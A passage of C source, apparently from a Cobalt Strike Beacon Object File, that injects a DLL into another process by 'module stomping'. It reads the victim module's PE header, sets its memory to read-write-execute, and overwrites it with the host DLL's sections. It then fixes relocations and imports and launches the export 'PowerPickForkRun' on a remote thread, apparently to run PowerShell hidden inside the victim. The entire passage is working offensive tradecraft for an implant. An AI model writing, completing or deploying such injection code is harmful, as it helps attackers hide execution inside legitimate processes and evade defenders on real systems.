        BYTE hdr[0x400];
        IMAGE_DOS_HEADER* remoteDos;
        IMAGE_NT_HEADERS64* remoteNt;
        DWORD remoteSize;
        DWORD lfanew;

        if (!PpfStompRemoteRead(hProcess, (LPCVOID)remoteBase, hdr, sizeof(hdr))) {
            PpfStompFail("read victim hdr");
            return FALSE;
        }
        remoteDos = (IMAGE_DOS_HEADER*)hdr;
        lfanew = (DWORD)remoteDos->e_lfanew;
        if (remoteDos->e_magic != IMAGE_DOS_SIGNATURE ||
            lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) {
            PpfStompFail("victim pe hdr");
            return FALSE;
        }
        remoteNt = (IMAGE_NT_HEADERS64*)(hdr + lfanew);
        remoteSize = remoteNt->OptionalHeader.SizeOfImage;
        if (remoteSize < sizeOfImage) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] stomp: victim too small (need=%lu have=%lu)",
                (unsigned long)sizeOfImage,
                (unsigned long)remoteSize);
            return FALSE;
        }
    }

    /* Protect only committed regions (full SizeOfImage protect fails). */
    if (!PpfStompProtectRange(
            hProcess,
            (LPVOID)remoteBase,
            sizeOfImage,
            PAGE_EXECUTE_READWRITE)) {
        PpfStompFail("VirtualProtectEx regions");
        return FALSE;
    }

    /* Write our headers + sections over the victim. */
    if (!PpfStompRemoteWrite(
            hProcess, (LPVOID)remoteBase, hostDll, sizeOfHeaders)) {
        PpfStompFail("write headers");
        return FALSE;
    }

    {
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
        for (secIndex = 0; secIndex < nt->FileHeader.NumberOfSections;
             secIndex++) {
            if (sec[secIndex].SizeOfRawData == 0) {
                continue;
            }
            if (sec[secIndex].PointerToRawData + sec[secIndex].SizeOfRawData >
                (DWORD)hostDllLen) {
                PpfStompFail("section bounds");
                return FALSE;
            }
            if (sec[secIndex].VirtualAddress + sec[secIndex].SizeOfRawData >
                sizeOfImage) {
                PpfStompFail("section va");
                return FALSE;
            }
            if (!PpfStompRemoteWrite(
                    hProcess,
                    (LPVOID)(remoteBase + sec[secIndex].VirtualAddress),
                    hostDll + sec[secIndex].PointerToRawData,
                    sec[secIndex].SizeOfRawData)) {
                BeaconPrintf(
                    CALLBACK_ERROR,
                    "[!] stomp: write section[%u] failed (err=%lu)",
                    (unsigned)secIndex,
                    KERNEL32$GetLastError());
                return FALSE;
            }
        }
    }

    if (!PpfStompApplyRelocs(
            hProcess,
            remoteBase,
            (ULONG_PTR)nt->OptionalHeader.ImageBase,
            (const BYTE*)hostDll,
            (DWORD)hostDllLen,
            sizeOfImage)) {
        PpfStompFail("relocs");
        return FALSE;
    }

    if (!PpfStompResolveImports(
            hProcess, remoteBase, (const BYTE*)hostDll, (DWORD)hostDllLen)) {
        PpfStompFail("imports");
        return FALSE;
    }

    exportRva = PpfStompGetExportRva(
        (const BYTE*)hostDll, (DWORD)hostDllLen, "PowerPickForkRun");
    if (!exportRva) {
        PpfStompFail("export");
        return FALSE;
    }
    entry = remoteBase + exportRva;

    /*
     * Skip MinGW CRT DllMainCRTStartup — it hangs on a stomped module
     * (.tls / LDR still named as the victim). Host DllMain only calls
     * DisableThreadLibraryCalls; msvcrt/oleaut32 are already initialized
     * via preload. Call PowerPickForkRun directly.
     */
    (void)nt->OptionalHeader.AddressOfEntryPoint;

    mapNameLen = MSVCRT$strlen(mapName) + 1;
    remoteMapName = PpfStompRemoteAlloc(hProcess, mapNameLen, PAGE_READWRITE);
    if (!remoteMapName ||
        !PpfStompRemoteWrite(hProcess, remoteMapName, mapName, mapNameLen)) {
        PpfStompFail("map name");
        return FALSE;
    }

    /* Fire-and-forget — export ExitProcess's when done. */
    if (!PpfStompRemoteCall4(
            hProcess, entry, 0, remoteBase, (ULONG_PTR)remoteMapName, 0, 0)) {
        PpfStompFail("PowerPickForkRun thread");
        return FALSE;
    }
    return TRUE;
}
